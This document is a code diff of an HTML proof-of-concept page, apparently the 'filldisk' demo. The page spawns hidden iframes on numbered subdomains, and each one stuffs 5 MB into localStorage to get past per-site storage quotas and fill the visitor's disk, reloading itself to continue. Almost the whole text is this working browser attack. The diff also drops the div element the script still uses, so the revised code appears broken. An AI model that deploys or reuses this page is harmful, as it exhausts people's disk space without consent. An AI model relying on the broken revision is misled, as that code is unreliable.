@@ -1,74 +1,73 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <style>
-      body { background: red; }
-      iframe { height: 0; }
-    </style>
-  </head>
-  <body>
-    <div></div>
+<head>
+  <meta charset="utf-8">
+  <style>
+    body { background: red; }
+    iframe { height: 0; }
+  </style>
+</head>
+<body>
+<script>
 
-    <script>
-      var frameNum = window.location.hash.length ? parseInt(window.location.hash.substring(1)) : 1
-        , body = document.getElementsByTagName('body')[0]
-        , div = document.getElementsByTagName('div')[0]
+var frameNum = window.location.hash.length
+  ? parseInt(window.location.hash.substring(1))
+  : 1
+var body = document.getElementsByTagName('body')[0]
+var div = document.getElementsByTagName('div')[0]
 
-      function injectFrames(num) {
-        for (var i = 0; i < num; i++) {
-          var iframe = document.createElement('iframe')
-          iframe.src = 'http://subdomain-' + frameNum + '.feross.net/filldisk/'
-          body.appendChild(iframe)
+function injectFrames(num) {
+  for (var i = 0; i < num; i++) {
+    var iframe = document.createElement('iframe')
+    iframe.src = 'http://' + frameNum + '.filldisk.com'
+    body.appendChild(iframe)
 
-          frameNum += 1
-          if (frameNum % 50 == 0) {
-            window.setTimeout(function () {
-              window.location.hash = frameNum + 1
-              window.location.reload()
-            }, 5000)
-            window.clearInterval(window.myInt)
-          }
-        }
+    frameNum += 1
+    if (frameNum % 50 == 0) {
+      window.setTimeout(function () {
+        window.location.hash = frameNum + 1
+        window.location.reload()
+      }, 5000)
+      window.clearInterval(window.myInt)
+    }
+  }
+}
+
+// Top frame
+if (window.top == window.self) {
+  window.myInt = window.setInterval(function () {
+    injectFrames(5)
+    div.innerHTML = 'Used ' + (frameNum * 5) + 'MB of space.'
+  }, 1500)
+
+// Sub frames
+} else {
+  // The following code adapted from http://arty.name/localstorage.html
+
+  function repeat(string, count) {
+      var array = [];
+      while (count--) {
+    array.push(string);
       }
+      return array.join('');
+  }
 
-      // Top frame
-      if (window.top == window.self) {
-        window.myInt = window.setInterval(function () {
-          injectFrames(5)
-          div.innerHTML = 'Used ' + (frameNum * 5) + 'MB of space.'
-        }, 1500)
+  var n10b =    '0123456789';
+  var n100b =   repeat(n10b, 10);
+  var n1kib =   repeat(n100b, 10);
+  var n10kib =  repeat(n1kib, 10);
+  var n100kib = repeat(n10kib, 10);
+  var n5mib =   repeat(n100kib, 25);
 
-      // Sub frames
-      } else {
-        // The following code adapted from http://arty.name/localstorage.html
+  // Set 5 MB
+  try {
+    localStorage.filldisk = n5mib;
+    div.innerHTML = 'Set ' + n5mib.length + ' chars into localstorage on ' + window.location.hostname
+  } catch (e) {
+    alert('local storage exception')
+  }
+}
 
-        function repeat(string, count) {
-            var array = [];
-            while (count--) {
-          array.push(string);
-            }
-            return array.join('');
-        }
-
-        var n10b =    '0123456789';
-        var n100b =   repeat(n10b, 10);
-        var n1kib =   repeat(n100b, 10);
-        var n10kib =  repeat(n1kib, 10);
-        var n100kib = repeat(n10kib, 10);
-        var n5mib =   repeat(n100kib, 25);
-
-        // Set 5 MB
-        try {
-          localStorage.filldisk = n5mib;
-          div.innerHTML = 'Set ' + n5mib.length + ' chars into localstorage on ' + window.location.hostname
-        } catch (e) {
-          alert('local storage exception')
-        }
-      }
-
-
-
-    </script>
-  </body>
+</script>
+</body>
 </html>
